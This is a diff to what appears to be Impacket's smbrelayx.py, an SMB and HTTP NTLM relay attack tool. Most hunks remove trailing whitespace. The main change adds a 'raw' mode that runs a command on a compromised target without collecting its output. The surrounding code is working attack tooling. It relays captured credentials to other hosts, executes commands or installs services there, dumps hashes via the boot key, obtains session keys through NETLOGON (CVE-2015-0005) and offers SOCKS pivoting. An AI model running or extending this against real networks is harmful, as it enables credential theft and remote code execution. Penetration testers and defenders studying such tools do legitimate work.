@@ -12,25 +12,25 @@
 #
 # Description:
 #             This module performs the SMB Relay attacks originally discovered
-# by cDc. It receives a list of targets and for every connection received it 
+# by cDc. It receives a list of targets and for every connection received it
 # will choose the next target and try to relay the credentials. Also, if
-# specified, it will first to try authenticate against the client connecting 
+# specified, it will first to try authenticate against the client connecting
 # to us.
-# 
-# It is implemented by invoking a SMB and HTTP Server, hooking to a few 
-# functions and then using the smbclient portion. It is supposed to be 
-# working on any LM Compatibility level. The only way to stop this attack 
+#
+# It is implemented by invoking a SMB and HTTP Server, hooking to a few
+# functions and then using the smbclient portion. It is supposed to be
+# working on any LM Compatibility level. The only way to stop this attack
 # is to enforce on the server SPN checks and or signing.
-# 
-# If the target system is enforcing signing and a machine account was provided, 
-# the module will try to gather the SMB session key through 
+#
+# If the target system is enforcing signing and a machine account was provided,
+# the module will try to gather the SMB session key through
 # NETLOGON (CVE-2015-0005)
 #
-# If the authentication against the targets succeed, the client authentication 
-# success as well and a valid connection is set against the local smbserver. 
-# It's up to the user to set up the local smbserver functionality. One option 
-# is to set up shares with whatever files you want to the victim thinks it's 
-# connected to a valid SMB server. All that is done through the smb.conf file or 
+# If the authentication against the targets succeed, the client authentication
+# success as well and a valid connection is set against the local smbserver.
+# It's up to the user to set up the local smbserver functionality. One option
+# is to set up shares with whatever files you want to the victim thinks it's
+# connected to a valid SMB server. All that is done through the smb.conf file or
 # programmatically.
 #
 from __future__ import division
@@ -90,7 +90,7 @@ ATTACKED_HOSTS = set()
 CODEC = sys.getdefaultencoding()
 
 class doAttack(Thread):
-    def __init__(self, SMBClient, exeFile, command):
+    def __init__(self, SMBClient, exeFile, command, raw):
         Thread.__init__(self)
 
         if isinstance(SMBClient, SMB) or isinstance(SMBClient, SMB3):
@@ -100,6 +100,7 @@ class doAttack(Thread):
 
         self.__exeFile = exeFile
         self.__command = command
+        self.__raw = raw
         self.__answerTMP = b''
         if exeFile is not None:
             self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
@@ -138,21 +139,25 @@ class doAttack(Thread):
 
             try:
                 if self.__command is not None:
-                    remoteOps._RemoteOperations__executeRemote(self.__command)
+                    if self.__raw:
+                        remoteOps._RemoteOperations__executeRemoteRaw(self.__command)
+                    else:
+                        remoteOps._RemoteOperations__executeRemote(self.__command)
                     logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
-                    self.__answerTMP = b''
-                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
-                    logging.debug('Raw answer %r' % self.__answerTMP)
+                    if not self.__raw:
+                        self.__answerTMP = b''
+                        self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                        logging.debug('Raw answer %r' % self.__answerTMP)
 
-                    try:
-                        print(self.__answerTMP.decode(CODEC))
-                    except UnicodeDecodeError:
-                        logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
-                                      'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
-                                  'again with -codec and the corresponding codec')
-                        print(self.__answerTMP)
+                        try:
+                            print(self.__answerTMP.decode(CODEC))
+                        except UnicodeDecodeError:
+                            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
+                                          'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
+                                      'again with -codec and the corresponding codec')
+                            print(self.__answerTMP)
 
-                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                        self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                 else:
                     bootKey = remoteOps.getBootKey()
                     remoteOps._RemoteOperations__serviceDeleted = True
@@ -195,7 +200,7 @@ class SMBClient(SMB):
     def login_standard(self, user, domain, ansiPwd, unicodePwd):
         smb = NewSMBPacket()
         smb['Flags1']  = 8
-        
+
         sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
         sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
         sessionSetup['Data']       = SMBSessionSetupAndX_Data()
@@ -332,13 +337,13 @@ class SMBClient(SMB):
 
         logging.info("%s\\%s successfully validated through NETLOGON" % (
         domainName, authenticateMessage['user_name'].decode('utf-16le')))
- 
+
         encryptedSessionKey = authenticateMessage['session_key']
         if encryptedSessionKey != '':
             signingKey = generateEncryptedSessionKey(
                 resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
         else:
-            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey'] 
+            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']
 
         logging.info("SMB Signing key: %s " % hexlify(signingKey))
 
@@ -352,9 +357,9 @@ class SMBClient(SMB):
     def sendAuth(self, serverChallenge, authenticateMessageBlob):
         smb = NewSMBPacket()
         smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
-        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
+        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
         # Are we required to sign SMB? If so we do it, if not we skip it
-        if self._SignatureRequired: 
+        if self._SignatureRequired:
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
         smb['Uid'] = self._uid
 
@@ -376,7 +381,7 @@ class SMBClient(SMB):
         sessionSetup['Data']['SecurityBlob'] = authenticateMessageBlob
         smb.addCommand(sessionSetup)
         self.sendSMB(smb)
-            
+
         smb = self.recvSMB()
         errorCode = smb['ErrorCode'] << 16
         errorCode += smb['_reserved'] << 8
@@ -384,7 +389,7 @@ class SMBClient(SMB):
 
         if errorCode == STATUS_SUCCESS and self._SignatureRequired is True and self.domainIp is not None:
             try:
-                errorCode = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)    
+                errorCode = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)
             except:
                 logging.debug('Exception:', exc_info=True)
                 raise
@@ -394,11 +399,11 @@ class SMBClient(SMB):
     def sendNegotiate(self, negotiateMessage):
         smb = NewSMBPacket()
         smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
-        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
+        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
         # Are we required to sign SMB? If so we do it, if not we skip it
-        if self._SignatureRequired: 
+        if self._SignatureRequired:
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
-          
+
 
         sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
         sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
@@ -413,7 +418,7 @@ class SMBClient(SMB):
         # Let's build a NegTokenInit with the NTLMSSP
         # TODO: In the future we should be able to choose different providers
 
-        blob = SPNEGO_NegTokenInit() 
+        blob = SPNEGO_NegTokenInit()
 
         # NTLMSSP
         blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
@@ -557,7 +562,7 @@ class HTTPRelayServer(Thread):
                    logging.error("Connection against target %s FAILED" % self.target)
                    logging.error(str(e))
 
-                clientChallengeMessage = self.client.sendNegotiate(token) 
+                clientChallengeMessage = self.client.sendNegotiate(token)
                 self.challengeMessage = NTLMAuthChallenge()
                 self.challengeMessage.fromString(clientChallengeMessage)
                 self.do_AUTHHEAD(message = b'NTLM '+base64.b64encode(clientChallengeMessage))
@@ -609,7 +614,7 @@ class HTTPRelayServer(Thread):
                                  {'CHALLENGE_MESSAGE': self.challengeMessage}))
                             logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                         else:
-                            clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
+                            clientThread = doAttack(self.client,self.server.exeFile,self.server.command,self.server.raw)
                             self.client = None
                             clientThread.start()
                     else:
@@ -621,7 +626,7 @@ class HTTPRelayServer(Thread):
                     self.send_header('Content-type', 'text/html')
                     self.send_header('Content-Length','0')
                     self.end_headers()
-            return 
+            return
 
     def __init__(self, outputFile=None):
         Thread.__init__(self)
@@ -645,6 +650,9 @@ class HTTPRelayServer(Thread):
 
     def setCommand(self, command):
         self.command = command
+
+    def setRaw(self, raw):
+        self.raw = raw
 
     def setSocks(self, socks):
         self.runSocks = socks
@@ -673,7 +681,7 @@ class SMBRelayServer(Thread):
         Thread.__init__(self)
         self.daemon = True
         self.server = 0
-        self.target = '' 
+        self.target = ''
         self.mode = 'REFLECTION'
         self.domainIp = None
         self.machineAccount = None
@@ -747,7 +755,7 @@ class SMBRelayServer(Thread):
         else:
             logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
 
-        try: 
+        try:
             if recvPacket['Flags2'] & SMB.FLAGS2_EXTENDED_SECURITY == 0:
                 extSec = False
             else:
@@ -764,7 +772,7 @@ class SMBRelayServer(Thread):
         except Exception as e:
             logging.error("Connection against target %s FAILED" % self.target)
             logging.error(str(e))
-        else: 
+        else:
             encryptionKey = client.get_encryption_key()
             smbData[self.target] = {}
             smbData[self.target]['SMBClient'] = client
@@ -805,7 +813,7 @@ class SMBRelayServer(Thread):
                blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
                token = blob['MechToken']
 
-            # Here we only handle NTLMSSP, depending on what stage of the 
+            # Here we only handle NTLMSSP, depending on what stage of the
             # authentication we are, we act on it
             messageType = unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
 
@@ -817,7 +825,7 @@ class SMBRelayServer(Thread):
                 connData['NEGOTIATE_MESSAGE'] = negotiateMessage
 
                 #############################################################
-                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client. 
+                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                 # Let's send it to the target server and send the answer back to the client.
 
                 # Let's check if we already attacked this host.
@@ -851,7 +859,7 @@ class SMBRelayServer(Thread):
                     smbData[self.target]['SMBClient'] = smbClient
 
                 smbClient = smbData[self.target]['SMBClient']
-                clientChallengeMessage = smbClient.sendNegotiate(token) 
+                clientChallengeMessage = smbClient.sendNegotiate(token)
                 challengeMessage = NTLMAuthChallenge()
                 challengeMessage.fromString(clientChallengeMessage)
                 #############################################################
@@ -865,7 +873,7 @@ class SMBRelayServer(Thread):
 
                 # Setting the packet to STATUS_MORE_PROCESSING
                 errorCode = STATUS_MORE_PROCESSING_REQUIRED
-                # Let's set up an UID for this connection and store it 
+                # Let's set up an UID for this connection and store it
                 # in the connection's data
                 # Picking a fixed value
                 # TODO: Manage more UIDs for the same session
@@ -937,7 +945,7 @@ class SMBRelayServer(Thread):
                         del (smbData[self.target])
                     else:
                         del (smbData[self.target])
-                        clientThread = doAttack(smbClient,self.exeFile,self.command)
+                        clientThread = doAttack(smbClient,self.exeFile,self.command,self.raw)
                         clientThread.start()
 
 
@@ -961,7 +969,7 @@ class SMBRelayServer(Thread):
 
             respParameters['SecurityBlobLength'] = len(respToken)
 
-            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength'] 
+            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
             respData['SecurityBlob']       = respToken.getData()
 
         else:
@@ -1029,7 +1037,7 @@ class SMBRelayServer(Thread):
                 else:
                     # Remove the target server from our connection list, the work is done
                     del (smbData[self.target])
-                    clientThread = doAttack(smbClient, self.exeFile, self.command)
+                    clientThread = doAttack(smbClient, self.exeFile, self.command, self.raw)
                     clientThread.start()
                 # Now continue with the server
 
@@ -1047,7 +1055,7 @@ class SMBRelayServer(Thread):
         respData['NativeOS']     = smbServer.getServerOS()
         respData['NativeLanMan'] = smbServer.getServerOS()
         respSMBCommand['Parameters'] = respParameters
-        respSMBCommand['Data']       = respData 
+        respSMBCommand['Data']       = respData
 
         # From now on, the client can ask for other commands
         connData['Authenticated'] = True
@@ -1067,13 +1075,16 @@ class SMBRelayServer(Thread):
         self._start()
 
     def setTargets(self, targets):
-        self.target = targets 
+        self.target = targets
 
     def setExeFile(self, filename):
         self.exeFile = filename
 
     def setCommand(self, command):
         self.command = command
+
+    def setRaw(self, raw):
+        self.raw = raw
 
     def setSocks(self, socks):
         self.runSocks = socks
@@ -1198,7 +1209,7 @@ if __name__ == '__main__':
 
         s.start()
         threads.add(s)
-        
+
     print("")
     logging.info("Servers started, waiting for connections")
     while True:
